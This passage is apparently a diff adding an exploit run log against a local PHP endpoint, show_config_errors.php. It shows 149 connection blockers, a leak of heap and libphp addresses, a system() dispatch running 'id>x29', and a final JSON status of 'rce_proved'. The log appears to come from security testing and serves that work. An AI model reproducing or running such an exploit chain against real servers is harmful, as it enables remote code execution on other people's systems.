@@ -1,0 +1,35 @@
+Local time context: 2026-10-25 Australia/Adelaide
+Target: http://127.0.0.1:18212/show_config_errors.php
+
+Pre-run marker check:
+PROOF_ABSENT
+
+Pool observation during settle:
+APACHE_CHILDREN=150
+MEM=119.3MiB / 15.18GiB CPU=5.08%
+
+Runner console output:
+[*] blockers connected 149/149; settling 10.0s
+[*] blockers alive after settle 149/149; failures=0
+rotate: A-fill + minimal session end
+leak attempt 1/3
+  cookie=600000B ptrs=3039 heap=0x7f675d600000 libphp=0x7f675f324000
+dispatch: table=0x7f675d6690d8 system=0x7f675f789370 cmd=b'id>x29' carrier=adopted live=0x31
+{
+  "target": "http://127.0.0.1:18212/show_config_errors.php",
+  "host_header": "x",
+  "requested_blockers": 149,
+  "command": "id>x29",
+  "fetch": "/x29",
+  "exact_profile_acknowledged": true,
+  "connected_blockers": 149,
+  "blocker_failures_at_start": 0,
+  "blockers_alive_after_settle": 149,
+  "blocker_failures_after_settle": 0,
+  "heap": "0x7f675d600000",
+  "libphp": "0x7f675f324000",
+  "status": "rce_proved",
+  "fire_attempt": 1,
+  "blockers_alive_at_proof": 149,
+  "blocker_failures_total": 0
+}
